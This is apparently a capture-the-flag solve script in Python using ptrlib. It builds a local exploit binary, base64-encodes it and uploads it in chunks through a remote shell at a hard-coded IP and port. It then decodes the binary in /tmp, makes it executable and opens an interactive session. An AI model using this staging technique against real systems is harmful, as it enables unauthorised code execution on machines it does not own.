from ptrlib import *
import time
import base64
import os

def run(cmd):
    sock.sendlineafter("$ ", cmd)
    sock.recvline()
    return

os.system("make")
with open("solve", "rb") as f:
    payload = bytes2str(base64.b64encode(f.read()))

#sock = Process(["/bin/sh", "./start.sh"], cwd="../distfiles/")
#sock = Process(["/bin/sh", "./start.sh"], cwd="../challenge/qemu")
sock = Socket("54.249.58.143", 9003)
sock.recv()

run('cd /tmp')
print("[+] Uploading...")
for i in range(0, len(payload), 512):
    run('echo "{}" >> b64solve'.format(payload[i:i+512]))
run('base64 -d b64solve > solve')
run('rm b64solve')
run('chmod +x solve')

sock.interactive()
